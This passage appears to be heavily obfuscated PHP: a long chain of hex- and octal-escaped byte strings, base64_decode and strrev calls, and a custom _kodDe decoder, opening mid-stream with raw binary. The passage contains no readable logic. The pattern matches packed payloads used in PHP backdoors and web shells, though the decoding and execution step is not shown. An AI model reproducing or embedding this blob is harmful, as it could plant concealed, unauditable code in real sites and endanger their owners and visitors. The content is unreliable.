Í?Ó»æóº¼ÏG÷#áèüÉ·~÷¼ñkÿë_ó±ßûËş')."\x42\xa4\xe9\xd7\x47\x4\x7f\xf1\xb3\xef\xc6\x7f\x36\xe1\x7b\xd7\xde\x58\xb7\x8f\xef\xd8\x19\xaf\x7e\xfa\xcb\x77\x4b\x6f\x1f\x93\x52\xd6\xbc\x70\xe0\xb\x75\x6d\x77\x4c\x98\xdb\xb9\xeb\x82\xaa\xba\xbb\x1f\x79"."\342\322\37\264\353\77\272\155\257\37\176\271\355\361\106\377\51\255\143\117\267\156\271\253\373\1\75\377\351\113\323\237\70\155\361\63\177\135\265\361\243\325\325\103\57\136\365\370\351\201\147\237".base64_decode('aG//yynfnmf+5M33nrlm167Y+nOOCd6ydOVdt//i4L7Dby688bvrR159+fbr+/Z593sffQ==')."\274\351\345\377\34\267\343\336\273\36\374\350\263\333\153\326\130\127\376\163\343\265\33\126\257\234\361\362\51\347\172\16\371\376\117\62\241\375\27\176\165\367\265\47\177\361\227\261\53\376\221\234"."\xf8\xef\x9b\x8b\xaf\x6c\xfb\xef\xde\x9d\xd7\xed\x73\xfd\xe4\xa1\x33\xf\xba\x77\xf2\xe7\x5b\x23\xab\xa6\x1e\x15\x38\xe4\xab\xd3\xdf\x3a\xe3\xf4\xf\x2e\xbd\xdf\x6c\xd9\x30\xe7\x85\x83\x46\x5e\xbc\xe8\xfb\xc1"."\x8f\xe\x7f\x3c\xb3\xed\xd1\x29\x13\xaf\xb9\xbc\x71\xdb\x1\x7a\xf7\x7d\x1b\xbe\xfc\xfd\xd9\x7d\xea\xaa\x2f\xbe\xfc\xe5\xcd\xfe\x13\x36\x7e\xf9\xda\xd2\xdd\x5f\xfd\xfb\xe5\x7f\xb5\x1f\xad\x9e\xf0\xc9\xbb\xaf"."\x47\xbf\xfa\x72\xec\xf1\xea\xdd\xbf\x7f\xe8\x80\xb3\x3f\x7b\xe1\xb9\xdd\x17\x7f\xf5\xaf\xc6\x2f\xfe\xf3\xb9\xff\xe2\x5b\x57\xad\x3a\xe1\xa3\x47\xff\x65\x7e\x55\xf8\xf2\xc3\xd3\x2f\x56\xff\xf3\xc6\xdb\x1f\x47"."\277\372\352\325\337\17\57\377\341\13\137\64\275\370\73\173\122\135\337\55\257\176\154\54\253\67\377\272\353\303\331\352\372\177\67\151\37\277\127\274\156\305\137\376\264\343\375\367\346\34\164\351"."\216\301\137\334\374\217\203\266\156\171\177\321\360\1\237\237\66\141\307\243\317\56\374\321\244\47\37\177\345\222\317\146\316\275\54\334\327\167\337\13\167\155\320\66\246\254\233\57\271\357\337\251"."\253\156\374\140\133\307\243\137\314\70\371\331\103\207\57\72\372\324\17\73\356\131\166\333\236\55\147\371\47\205\136\275\350\366\265\253\317\375\331\323\47\76\213\166\236\11\277\372\360\236\354\244".base64_decode('5//20WHs6V49U4VKaZlizgBeEd70rM0X16VHQAxmrltTGMqD7i2oCM2eARLiebOhyIw5oA==').strrev('8sšÀ¨6c8Z2'."\0".'syŒÙÌaÏúÀÃsOHÏL9œÙì1¶'."\n".'úFèˆ,¡†d'."\r".'/î™4')."\143\200\134\153\320\136\127\52\16\201\50\114\133\333\147\257\263\100\162\71\243\1\252\154\230\13\25\314\152\200\33\347\324\140\177\51\63\314\224\352\62\326\332\374\210\123\362\75\157\26\364\153"."\xf6\x6c\xf8\xe8\x50\x46\x1b\xb1\x4d\xe0\xcf\xe7\xb0\xaa\xe7\xce\x60\xcd\x66\xe3\x39\x6b\x26\x7c\xc3\xc8\x58\x23\xa5\xd4\x10\x4b\x86\x5e\xad\xcd\x68\xd6\x9a\x75\x69\xf6\x15\xf8\xe8\xcc\x79\x50\x78\x36\x54\x37"._kodDe('MExdOfG5iPFoHnH0BbjIuZxW/R2uvcVabtjh31Tq8QiuG2kFmX4soUyWXG5OGYbXjVVJBPo=')."\xd8\x79\x7a\x28\xdd\x9f\x81\x51\x28\xd\xdb\x83\x66\x8e\x49\xfc\xd6\x65\x87\xb\xbd\x83\x6c\xc2\xa1\xa6\xa1\xe1\x42\x6a\xed\x3a\xe0\xc7\xe7\xd6\x43\xf7\x66\xb0\x49\x2b\xc\xf\xe8\x99\x3e\x98\x89\xd9\xf3\x60"."\64\33\130\276\336\234\235\316\60\115\212\171\163\241\361\63\331\334\257\31\312\351\46\173\166\223\263\6\264\336\54\344\35\311\345\373\326\132\160\167\72\167\336\134\206\123\320\117\66\323\231\142".base64_decode('72A2B1hdzFqD9pohdkgdtEeKa2gk25/TbCYmMfCZwlzHJgzGcbB3eG2BabQNaCPFIXY5Xg==')."\320\207\372\254\201\65\254\343\320\204\274\325\73\270\106\7\361\107\156\104\313\254\141\217\337\62\271\241\201\136\366\244\153\36\237\127\206\370\63\33\346\261\245\4\243\325\237\353\33\264\231\214"."\263\70\74\142\352\153\140\110\32\146\3\66\314\254\207\274\43\246\245\17\14\61\211\177\161\170\60\325\133\142\171\331\350\262\365\63\143\16\224\236\305\260\146\250\230\317\25\330\45\106\103\303"."\14\206\124\320\47\273\324\327\157\245\1\367\353\147\2\64\223\322\373\7\327\261\167\144\371\336\65\366\40\164\156\135\106\57\145\31\306\130\175\351\221\376\136\233\115\24\103\343\172\370\364\332".base64_decode('3hI6iTO1E7N37WA/KKTMbWDtnQUonxlJIUrClKJyQ/35AfhI3lyrD48AWthrSoPpoQE2rA==').base64_decode('UHgmW8n5oolO2gW2gOeyAEy4ntXWjhSgKqMvmxocZjrOIwXDXJthqJAvGcVe1i2YxIzZNw==').strrev('`¯“*0-Sk,º®e`–³^!'."\n".'Ë:#ï.be®d»4ƒ@¢ŒÙ¼öh}µˆÜìLa³˜')."\xd8\x33\x4b\x23\xef\xcb\xa1\x96\x32\xd5\x8c\xe\x50\x17\x91\x61\x3\x3a\x6b\x23\xd3\x49\xb0\x85\x2e\x7\x28\x23\x3\xdc\xc8\xe9\x42\x4a\x4e\xef\x22\x58\x49\x71\x76\xc7\xad\x97\xb4\x41\x70\x34\x2e\xd7\x92\xca"."\xdb\x52\x32\x8a\x39\x52\xe3\xf2\x1b\x2\xe8\x1d\x6e\xa1\x4f\xee\xf5\xf2\x1c\xd3\xd5\xae\x70\xa7\x9\xe2\x5d\xcb\x1a\x32\x8b\x30\x62\x3\x66\x3a\x95\x35\x4b\x69\x47\xad\xe9\x5e\x5f\x85\x91\xa4\x3d\xa9\x94\x92"."\161\303\271\366\220\250\320\241\20\317\140\216\121\353\45\63\312\125\225\360\37\150\67\175\316\154\141\225\164\376\306\215\335\210\71\237\16\323\72\174\154\272\172\45\44\241\127\0\266\146\15\370"."\x64\xb0\x57\x4e\x35\xf2\xa8\x17\xd9\xac\xcf\xf9\xec\x1d\xbf\x3f\xef\xee\x52\x13\x81\xf8\x62\x49\x31\x10\xbf\x8f\x76\x34\xa5\xac\x77\x62\x2a\xa5\x71\x95\x67\xd4\x39\x12\xc\x63\xf6\xdc\xfa\xc0\xe8\xd6\x8b\xc6"."\266\335\66\266\171\347\350\375\27\354\331\171\333\350\256\155\50\372\346\275\133\106\167\136\376\326\317\66\275\171\357\346\67\357\75\161\317\351\167\276\377\340\71\243\133\157\335\163\312\256\321\355"."\x37\x8c\x5e\x7b\xfa\x9b\xf\xec\xda\xf3\xf0\xe9\xbb\x6f\x38\xfb\xcd\x7b\x77\x8c\x6d\x3f\x73\x74\xd3\xdd\x6f\x3e\x70\xd1\xe8\x19\x57\x8e\x9e\xbe\x75\xec\x82\xcd\x6f\xee\xda\x8e\xf2\x8f\x9d\x21\x6a\x46\xd9\x46"."\167\134\202\313\76\170\362\350\275\367\356\271\352\6\236\372\376\203\47\1\301\202\255\256\135\267\225\370\361\141\246\355\105\320\124\131\250\0\202\352\226\117\351\312\352\150\304\24\362\360\32\253"."\x86\xd9\xfd\x7a\x51\xb1\x89\x8a\x98\x86\xfe\xe6\xcd\xbc\x97\x22\x20\x7d\xb2\x6f\x29\x46\x1e\x27\x2b\x6c\xac\x7d\x1c\x49\x13\x7a\xae\x80\x51\xd\x46\xc9\x4f\x5f\xc8\x3a\x1e\x5b\x48\xf8\x58\x69\x98\x69\x42\x5"."\xec\xc2\x63\x2d\xe6\xaa\x6\x7\x6b\xf9\xee\xa7\x2b\x19\xd\x1\xd2\x8d\x4a\x6\x15\x63\x97\x22\x3d\x8a\x6d\xb2\x30\x22\x5b\x6b\x2b\x7e\xab\xf2\xb4\xf2\x66\xb0\xa9\xed\xe3\x22\x7a\x21\x39\x86\x86\x49\xaf\x68".base64_decode('6PVMGUqRVeYkEY715yQucpJzJEC0S5QTPAptikchV9KK8yk4VjZge5+8ZuTmF/VClt9EYQ==')."\xe9\x68\xc5\x41\x74\x75\x21\x5e\x61\xb8\x78\x27\x1c\x89\x68\x3d\x96\xec\xa\x19\xe5\x51\x95\x45\xc6\x86\xd9\x92\x45\x4\x4e\xdc\x95\x12\xb5\x0\xd1\x5c\x1a\x15\xa2\x6a\xf4\x21\x4e\x1f\x8b\x7a\xda\x60\xca\xca"."\x7a\x8e\xe4\x4\xba\xe8\x93\x2e\x8a\xe8\xc3\x28\xae\x31\x9d\x42\x68\x5f\x74\xdc\x81\x2d\x58\x54\xe8\x2f\x60\xab\x1f\xf6\xfc\x45\xf0\x14\x81\x3d\x9e\x93\xda\x0\x61\xf1\x6\x4c\x86\x66\xdd\xf7\x6a\x7c\x91\xb4"."\x36\x4b\xb6\x37\x70\xb6\x46\xaf\xd7\x2b\xc9\x7f\x85\xd2\x1a\xe\xa9\xac\x63\xe4\x31\x4f\xbc\xbf\x64\x63\xdd\x8c\xf6\xac\xd9\xcb\xd0\x44\x5c\x5a\xa3\xec\x41\xbc\xb8\xc7\x83\xb7\x72\x5d\xe\xb4\xea\xfb\xfa\x50".strrev('¥'."\0".'g©&–Ÿ9ypù¬àLßTĞ.€\\Ä`IÓXL  æùf>²G«ë˜}A]2­•ä}')."\112\371\54\203\242\40\312\22\53\345\61\42\64\72\207\103\317\247\245\102\363\265\224\55\325\252\146\140\274\175\142\250\264\351\42\135\117\303\333\101\277\64\200\103\220\201\225\355\164\242\7\352"."\277\227\143\14\232\171\264\41\245\55\242\21\13\33\12\124\151\111\6\11\142\2\331\160\161\62\134\137\123\324\226\261\241\200\66\275\74\127\205\265\262\32\273\272\264\360\313\223\274\316\121\263"."\x64\xf1\xdb\x15\xac\x36\xae\xa2\xad\xde\x12\x68\xac\xa6\xd\x48\xc\x87\x9a\xd5\xd6\x50\x4c\xac\x7c\xb5\x50\x72\x5b\xe5\x90\x4d\xd7\x4\xba\x42\x6a\x3c\x1e\x95\x6c\x74\xc0\x63\x9b\xc5\xd1\x56\xb5\x25\x1a\x5d"."\34\2\14\155\224\50\46\176\137\51\156\265\161\114\274\263\304\27\74\262\106\233\314\242\140\243\42\170\333\215\53\240\371\211\326\100\113\107\40\306\165\356\147\371\352\174\365\42\57\372\240\212".strrev('vª<¦xfd†¬Ñ:R¢G…'."\n".'¢ÔâFww'."\r".'Ò©tG@ ff³95´ÁV Dñ'."\0".'[14')."\x85\x3\x2d\x41\x25\x14\x49\x44\xd9\x63\x9\xae\xd8\x4a\x9e\xcd\xc4\x79\x9c\xd\x41\xd1\xd2\xb9\x61\x19\x28\x4f\x23\xf2\xd3\x1e\xb9\x46\x5e\x13\xe0\xef\x4a\x4f\x75\xb2\x2a\x39\x2d\x59\x93\xac\x5d\xed\x4b\x5a"."\x3d\x7e\x69\xf\x33\xe4\xe9\x81\x48\x57\x2b\x74\xaf\x91\x87\xd2\x4c\x62\xd0\x19\x47\x9b\x3f\xd\x46\x63\x81\x96\x30\x6b\x4a\x73\x20\xe\xc1\x68\x4b\x88\x6\x76\x5f\x78\xfb\x9b\xf7\x6f\xd9\xfd\xf3\x9d\xa3\x67"."\156\106\25\215\135\172\362\330\305\167\43\226\5\263\51\73\317\331\375\320\226\261\13\157\35\73\7\330\13\145\317\255\367\274\271\353\341\335\27\336\60\272\363\222\261\213\356\333\175\351\251\64"."\xe1\xad\x1b\x6f\x1f\x3d\xeb\x6\xde\x30\xe5\xad\xb\x1e\x1a\xdb\x72\x1d\x67\x5d\x28\xc7\xe2\x41\xa5\xdf\xda\xb4\x79\xf7\xae\x9d\x98\x71\xb9\xe6\xc4\xb1\xbb\xce\x1e\xdb\xbe\x79\xf4\xac\xab\x46\x7f\x76\xc3\xee"."\55\267\216\136\175\312\350\151\233\367\334\272\155\222\33\221\150\174\45\233\12\170\342\355\137\205\237\347\323\341\115\132\323\361\320\326\242\337\32\374\22\3\375\62\205\162\242\140\174\174\167\60"."\322\22\164\277\145\222\243\140\225\147\32\305\20\252\163\3\34\254\5\126\175\130\234\330\311\150\252\36\267\25\33\140\376\245\106\111\215\151\15\306\133\142\241\346\40\350\372\363\211\232\112\370"."\54\120\233\100\320\170\154\11\17\363\67\260\145\126\224\224\32\206\314\265\212\243\43\232\57\145\146\113\271\74\151\254\122\205\25\300\252\74\170\137\42\17\253\224\52\274\307\42\200\216\37\365"."\327\140\53\46\104\117\270\172\171\265\247\316\123\137\253\200\211\45\132\2\14\53\51\125\240\156\316\313\71\76\342\351\165\304\352\75\165\265\112\125\141\240\12\332\45\306\25\265\136\245\71\55"."\105\363\324\100\203\345\346\212\274\210\214\131\166\121\63\20\135\123\122\36\16\342\345\321\257\303\130\122\312\47\112\320\171\102\71\334\60\45\20\151\165\346\244\66\226\272\252\211\266\146\312\147"."\x73\x73\x28\x6c\x9a\xab\x6b\x95\x5e\x78\x41\x51\x21\x91\x14\x73\xc\x46\x93\x63\x30\x6a\xa6\x3\x9d\xe8\x6a\xe7\xf3\x4d\x9f\x47\x28\xf4\xbd\x1c\x6d\x96\x66\xb1\x89\x2\x28\x99\x2a\xc\xa5\xb3\xc5\xf2\x9a\xa8"."\x1b\x68\x72\x68\x7e\x14\xe0\x29\xf8\xf9\x0\xaf\x9\x91\x23\x9e\xc0\x66\x10\xc3\xf9\x24\x56\x48\x23\xc6\xaf\xaa\x28\x2f\x48\xfb\x99\xb3\xfa\x18\xa9\x83\xa7\xfb\x9d\xcb\x79\x1f\x18\x2e\x73\x85\x26\x6e\x3a\xb"."\277\374\13\46\132\72\50\226\307\45\64\117\367\116\165\40\252\30\116\305\201\42\374\100\1\371\350\162\301\4\141\2\311\27\212\340\147\242\364\305\133\274\245\43\330\31\360\1\21\247\230\100"."\363\143\356\113\151\122\252\61\345\243\240\152\307\360\223\17\261\41\113\220\257\242\165\245\332\210\137\242\243\120\350\203\306\300\354\53\304\6\201\106\212\64\125\123\63\61\120\45\267\361\26\215".base64_decode('JVQ0AECeJapbLe0Wkk45fsY1yFi8DGKATGbwJt3LTMGhynGdLdFIW4g97muFc3MhbToytQ==')."\xc6\x42\xd8\xa\x8\x7c\x5f\x61\x55\x49\x4f\x2a\x51\x44\x28\x69\xa0\x48\x61\x28\xcd\xc3\xc2\xb0\x2\x4e\xe0\x7b\x3e\x8a\x88\x2d\x1f\x45\xf8\x66\x83\x73\x49\x36\xeb\xf0\xf7\xe3\x11\x1e\x16\xec\x2f\x8a\x74\xc7"."\331\363\16\114\175\227\266\362\160\7\177\22\215\23\242\61\51\22\210\5\72\343\74\32\133\312\237\213\160\30\175\66\242\106\272\73\5\305\17\7\226\40\144\211\12\6\205\121\353\32\337\264"."\105\265\111\372\32\217\6\351\317\261\54\206\137\50\365\254\257\367\50\263\67\326\102\36\156\115\303\356\67\362\214\311\304\137\71\76\254\206\243\355\64\116\154\351\5\363\151\161\132\121\126\52"."\210\343\115\10\216\327\142\133\27\137\15\12\302\141\205\76\362\125\42\321\245\1\141\236\115\112\0\210\260\326\346\137\265\62\71\224\364\41\146\301\132\55\136\327\265\66\53\214\15\41\206\124".base64_decode('4PAPpQNsG13tgR1DzZp9zMQRIoiMXaC/y1iA0EookCIPuId5IwLeFWpyQ/KYpNdHnzRi5g==')."\x25\xe9\x11\x4d\x52\x83\xcb\xd0\x1e\x1b\x8f\x3b\xde\x63\xaa\x39\xfc\xfe\x1b\x6a\x47\xbd\x84\x10\x5d\xb5\x34\xb2\x0\x7e\xe0\x3c\xb6\x0\xe\x4\x10\x5d\xd8\xc4\x27\x33\x78\xfc\x86\x8\xfa\xdb\x9e\xd8\x10\x44"."\177\303\350\47\234\100\323\145\360\14\150\111\206\103\213\203\33\360\77\42\241\226\17\44\175\265\344\54\20\212\154\100\377\42\2\263\41\24\161\127\326\34\114\54\15\6\151\6\26\206\137\221"."\25\21\34\350\252\144\153\21\277\44\200\144\361\262\0\252\126\325\32\62\230\336\236\351\265\252\352\267\272\1\137\270\115\220\232\352\51\365\325\260\207\4\342\55\202\372\72\20\242\34\27\210"."\336\277\23\21\270\5\101\210\267\307\242\335\135\122\274\43\260\44\24\151\147\61\377\64\26\232\6\125\53\255\241\70\32\242\26\206\214\302\260\241\34\7\206\223\260\105\62\327\353\100\351\126".strrev('`Ğ‹Œ„XİÂÎCÁsóÉÅ5•2Ãª„(l#8çGå[…îk*çfR€añÙbDQÙD')."\x31\x32\x5c\x2c\x42\xc\x28\xb2\x8\xe9\x28\x8b\xe0\xd3\x49\x30\xc2\xd2\xd0\xe1\x10\x1d\xec\xd8\x89\xaf\x5f\x1b\xe4\x6f\x28\xe7\xa7\x7b\x25\x83\x21\x98\x6\xfb\xa8\xbc\xc\x5b\x94\x41\xc7\x37\x8d\x4b\x4c\x5d"."\x22\x4e\x22\x9d\x92\x4e\xfc\x54\xa1\x4f\x91\x1e\x6f\x63\x59\xa9\x24\x51\xf2\xd3\x1c\x88\xf9\x24\x79\xd0\x6f\x72\xf5\x22\xc2\x1c\xaf\x66\x78\x4a\x9f\xf\xdb\x9\xc3\xce\x3a\x3e\xa\x4f\xc\xd1\x47\x43\xe4\x6d"."\xa7\xf4\x59\x76\x31\x43\x44\x83\xaa\x29\x89\xab\xc9\xbe\x2d\x3\x84\x30\x8a\xca\xb6\x41\x8e\x2b\x64\x3d\x58\xaf\x91\x48\x78\x69\xd4\x79\xa2\xe2\x64\x6a\x35\x3f\x28\x81\x21\x9\xf\xfc\x42\x8b\xbe\x4b\x7f\x92"."\20\145\302\213\44\174\244\332\3\233\156\222\61\354\53\223\303\165\165\136\364\317\134\364\267\31\375\155\101\177\203\30\320\226\34\236\323\206\2\363\332\172\374\160\351\224\114\126\215\67\234\220"."\x81\xd\x2a\x44\xab\x68\x94\x95\x32\xf8\x1e\x99\xea\xc7\x16\x6b\x54\x3b\xc7\x64\xe6\xe4\x30\x27\xc4\xd2\x54\x6c\x2e\xe2\xad\xb1\x68\x17\xe5\x58\x94\x50\x9b\x42\xed\x38\x28\xd5\x54\xd0\x5e\xd\xac\x58\x4b\x2c".base64_decode('iFcTzcXSaqodIq2F1Qo86a51lgpFWoPLlGojPaxqmgqFFbR2WUVKWU2sBtpWuF2z+s0hRQ==').strrev('B'."\n".'ÃâPÜ(õñ˜Xd”SÒaÃàÚ8¡I¦ƒ”)çˆp=f``XV2Ñ@„°¡n¾vGF')."\x45\x2c\x81\x56\x44\x93\x82\xcb\x12\xb1\x0\x6\x12\x6e\x75\xe2\x4\xf4\x87\x10\x20\x7c\x9a\x2a\xe6\x34\xfa\x9e\x94\xf0\x78\xbe\xd5\x20\x54\x58\xed\x60\x29\x29\xb3\x89\x99\x4a\xc0\x30\xb2\x45\x4a\x7d\xe2\x29"."\104\262\100\207\131\226\73\54\6\56\235\306\272\142\241\316\100\154\71\14\231\70\63\300\22\65\263\216\367\304\42\142\130\335\322\333\366\10\152\265\374\326\235\316\61\247\310\350\374\313\50\62"."\152\15\15\126\341\231\247\101\260\217\253\362\7\313\114\350\122\303\236\377\172\130\200\31\215\40\57\253\230\110\53\207\110\24\217\211\131\3\334\207\131\221\123\345\267\141\302\200\57\336\124\361"."\44\263\335\241\55\320\35\226\41\60\124\312\342\340\362\257\131\43\254\245\225\326\10\113\143\342\33\161\51\304\307\2\172\126\63\13\172\112\355\133\324\64\240\323\154\51\217\15\274\60\61\242"."\170\144\75\210\337\104\153\305\232\206\131\254\20\153\73\354\330\335\211\250\212\166\245\130\20\357\21\145\175\221\316\360\362\204\101\141\234\201\133\112\376\232\156\263\74\225\272\315\313\163\51\126"."\60\322\36\212\4\233\360\3\156\304\53\260\346\202\234\16\333\346\234\13\365\204\242\152\30\361\327\252\54\212\13\105\101\122\354\60\374\250\252\302\116\212\117\23\212\342\166\261\44\231\321\63".base64_decode('TKKU3cnfbxAtcoQsAWEtgUuzSVqpF5eWtz4o77KvapiNOAVnphzPfJFddXzcrYUtg4WCuA==')."\270\37\146\127\320\334\14\37\24\350\226\254\35\340\302\12\373\40\271\21\312\73\233\207\66\333\54\263\323\245\352\242\67\71\335\262\370\75\161\242\137\127\254\202\236\42\6\75\25\60\103\247"."\xa4\x4d\xdd\x12\xb6\xc9\x61\xec\xc9\x99\x8b\x5\xed\x7e\x61\x17\x42\xb6\x84\xdb\xda\xcc\x6\xb9\x94\xb7\xe3\x7a\x16\xa4\xf8\xad\xbd\x44\x13\x5f\x3c\xb7\x13\x8f\x99\x24\xd\x7d\x72\x4f\x23\x66\x8e\xda\xf7\x73"."\x15\x84\x9a\x42\x7c\x68\xa4\x5c\x2\x18\x16\xa6\x6f\xf1\xb5\x88\xa8\xb3\x87\x49\xe\xc4\x78\xac\x33\xd8\x6\xe9\xbe\x48\xe4\x8d\xcc\x9b\x5d\x7a\x31\x67\x90\xbb\xa0\xa5\xe2\xaa\x7\xf6\x20\x54\x1\x9d\x7f\x9f"."\xfb\x9d\x95\x3c\xea\xf8\xfe\xb0\x2c\x27\xb6\x7f\xf1\x75\x73\xc8\x2c\x4b\x91\x96\x49\x6f\x2d\x71\x94\x11\x85\x9c\xe3\x2d\x57\x29\x8f\x3e\xe2\x95\x1f\x36\x21\xdc\x21\x40\xe9\x29\x5\x33\x86\x48\x63\x73\x40\x73".base64_decode('B+EnBPoAwn6LLMUn7OWQOjFv5RVWK9Ka/PxUsm4/ScYUMuUCtzOGbMLCJ6wH8+VyLJ8o/A==')."\x2c\x1b\x6e\xe4\x31\xdb\x9e\x51\xa5\xb6\x74\xf1\xfc\xc2\x6e\x28\x1d\xd\x69\x1a\x8\x80\x6\xc9\x2\x57\x1a\x45\x23\x3a\xc\x8c\xff\x23\x12\xee\x48\xd0\x4e\x66\xd4\x9\x6c\x17\x87\xcd\x3e\x4e\x9b\x10\xfb\xa"."\6\277\34\364\51\24\205\262\76\35\77\254\242\317\134\202\334\364\43\52\110\355\264\175\163\241\156\311\174\363\70\44\245\142\271\26\310\310\77\130\44\242\247\157\376\140\114\27\34\1\52\106"."\336\261\175\143\41\101\142\311\227\110\41\211\54\273\312\20\164\244\157\156\140\346\373\41\131\340\30\332\13\42\121\265\3\155\67\121\306\260\30\126\302\101\336\131\51\40\41\66\342\247\122\176"."\xf2\xa0\x18\x8e\x8f\xf3\x89\xc6\x1\xbd\x3\x85\xc9\x5e\x8f\x28\x37\xf\x31\x2d\x12\xb0\x11\x26\x18\x85\x0\xfd\x59\x9e\x4b\x7b\x51\xc3\x1\xeb\xd2\xba\xcd\x2d\x35\x91\x17\x9a\x92\x1d\x29\xe9\x39\x76\x8e\x13".strrev('¡,!!¸–¶‡¥ùË-‚Æ¥ÂXãƒÓv1İ£Åß4ï)]€¦S8Lkgã¨6«^É!Ø')."\264\127\4\163\271\31\206\223\3\252\32\213\142\1\143\60\334\346\52\20\357\340\266\176\235\60\65\34\212\54\256\230\200\30\222\116\251\10\5\206\22\301\116\67\314\131\103\74\30\210\61\103".strrev('âãMò/ô“[XÜ”]¯Lö«Ã°Òœ©‰Éë’j«ı’x©‡pHùh¡ÉH¶Ş8Ô')."\67\112\256\244\147\277\343\200\55\266\371\64\272\1\170\337\142\100\132\14\142\176\237\17\76\302\3\376\244\237\231\3\363\213\104\370\25\371\47\273\366\30\60\374\36\247\266\225\34\15\165\231"."\x1f\x61\xef\xfd\x7d\xee\xb7\x65\x2a\x7b\x50\xc6\x28\xab\x96\x61\x9a\x6\x21\x7a\x89\xab\xc6\x97\xc7\xf9\x5c\x39\x61\xe\x8c\xa4\x38\x2d\x2b\x5c\xb8\x32\xa3\xbf\x5d\x72\x56\xac\xcb\x53\x31\xa3\x3\xa5\x1d\xcf".base64_decode('rWWQzzDFahHLOm2mStiak5gj8TgbgXyOKhBBHxAyAliVcbZ682ivhM24BXGt7R2h4xaHOw==').base64_decode('I9Gu42PxRPeSpcuWg9nORoY0GcXLJCJgB9eP+HX/IDP6vwQfSHTLLzNzHIj6iA0YMwNrVA==')."\220\301\123\61\365\360\127\116\242\265\371\163\171\273\176\234\34\135\105\275\327\64\355\161\122\227\164\176\175\305\220\270\62\151\365\160\54\115\353\203\254\323\72\250\223\12\255\70\113\234\307\200"."\333\360\312\136\10\60\332\312\214\143\272\327\305\26\0\100\370\344\220\230\7\1\344\266\254\151\164\104\27\32\206\346\220\144\13\232\255\36\124\34\130\52\260\115\333\216\115\261\62\323\253\153"."\x89\x41\x4d\xb7\x35\xce\xb5\x5e\x6d\xc0\x91\x2e\xec\x43\xaf\xf5\xa2\x13\xac\x23\xee\xb2\xc8\x79\xc\xd9\xa\x3a\xcd\xbe\x62\x83\xdf\xc6\xed\xcc\xa3\xed\x3\xda\x2\xc\x85\xbc\x5a\xc8\x96\xc2\x55\x87\xf0\xc6".base64_decode('1eFaqxzIzXjEiWJlozITrPq3IdY7rayk3DTI/zEnRgzT06hHEfazmeTWaRibLRcsZJMe0Q==')."\246\144\43\16\214\370\346\6\204\56\132\156\200\53\215\244\34\314\7\336\347\333\44\225\65\301\137\200\353\15\224\326\74\302\224\160\341\151\152\363\110\114\162\171\344\60\240\41\73\53\321\12"."\205\226\176\334\7\307\32\166\200\122\162\44\203\125\135\144\25\31\247\165\156\224\334\112\231\274\64\317\157\211\20\67\267\235\221\14\161\227\325\200\30\302\174\220\275\302\57\113\105\334\243\41"."\x92\xbf\xbe\x2d\x9d\x64\x78\x79\x66\x38\x40\xc0\x9a\x60\x5b\x87\xc5\x16\xe5\x31\xc3\x5e\xd3\xb2\xbc\x85\xa2\x89\x95\xe4\x9a\x8c\x5c\x9f\xdf\x1a\x82\xb4\xac\x66\xd9\x4b\x1c\x86\x8d\xbe\xd1\x2\x37\xb6\xdf\xd1"."\311\331\151\150\302\260\227\140\65\373\10\24\305\40\177\221\250\140\173\206\140\373\360\20\263\233\152\35\103\30\77\152\233\37\133\145\44\174\57\327\155\213\306\331\145\221\263\367\124\247\110\72"."\x89\x83\x51\xb8\x76\xa6\xda\xc3\x8d\x5d\xb\x13\xc7\x54\xc6\x4f\xc3\xc2\x34\x30\x62\xdf\x3\x7d\xd8\x9c\x89\x99\x67\xaf\xa\xa8\xb3\x3\xd9\x32\x7a\x5a\x27\xcd\xe5\xaf\xf0\x25\xa3\xe2\xd8\xe1\x6\x5a\xea\x4c"."\375\117\62\57\216\30\302\76\76\215\304\350\257\154\254\21\17\271\67\347\360\263\101\47\310\151\264\333\322\365\1\246\256\210\147\133\120\224\42\267\255\116\257\176\275\25\1\136\111\1\221\256"."\47\311\377\2\376\34\310\1\372\251\147\7\150\57\375\131\121\251\365\336\242\60\167\216\146\207\372\211\130\254\217\60\263\324\137\157\331\72\331\236\354\114\46\344\356\332\105\55\223\101\215\225".base64_decode('zLDySRT2zQGTiL8U1v3xraPDncYxFY2rQ2KM9rsFn7yGsTMLYQO0OxZ2XFRBVtbDdf3eFg==')."\246\11\146\226\262\151\162\232\105\237\62\263\350\40\57\256\254\307\56\276\162\354\227\333\366\74\174\371\330\226\353\336\274\367\201\261\355\367\123\70\35\261\126\75\317\347\175\354\354\363\167\77"."\160\331\236\235\17\277\165\361\316\367\37\74\147\317\255\367\140\225\244\53\256\243\32\112\243\133\117\36\333\166\333\350\326\263\366\334\165\352\330\375\347\216\135\166\312\133\77\73\367\215\23\117"."\x86\x95\x93\x27\xc6\x48\x3\xc5\xbe\x92\x18\x27\x5a\x64\xec\xca\x7\x47\x1f\xdc\xfa\xd6\x85\x3f\xdb\x73\xeb\xad\x52\x7e\x1b\x2b\xcc\x65\xa5\xa5\x83\x66\x71\xf4\xb4\x4d\x6f\x9d\x72\xc3\xe8\xd6\xf3\x76\x5f\x78"."\105\131\1\372\1\367\74\343\356\155\73\143\367\245\247\112\51\356\102\315\304\140\273\70\302\363\62\64\141\364\334\315\273\177\161\233\273\20\265\340\137\241\320\330\105\247\277\371\300\335\256\102"."\21\63\136\112\365\67\113\226\341\307\316\71\175\164\347\245\374\43\157\336\273\231\352\252\273\212\160\25\71\236\237\326\137\236\77\316\60\272\325\324\55\264\217\166\152\166\12\26\361\356\35\17".strrev('ŒówÅØÓ{¹ï\'íÁ\\]mU€µy;U÷f¸í×¹èër\\LÂg